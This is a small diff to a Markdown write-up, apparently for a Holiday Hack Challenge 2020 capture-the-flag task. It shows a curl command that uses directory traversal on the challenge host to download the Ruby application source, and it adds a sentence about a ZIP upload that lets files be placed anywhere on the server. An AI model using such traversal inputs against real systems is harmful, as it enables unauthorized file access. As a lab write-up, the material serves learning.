@@ -27,7 +27,8 @@ The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/
 ```
 curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app.rb --output app.rb
 ```
+This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEzNjA2MDY4MzcsMTMxMjA1NjQ1Myw5Mj
-A0NTU4NjUsLTE2MDYwNzgwNDBdfQ==
+eyJoaXN0b3J5IjpbLTI0Mzk0Mjg2NiwxMzEyMDU2NDUzLDkyMD
+Q1NTg2NSwtMTYwNjA3ODA0MF19
 -->
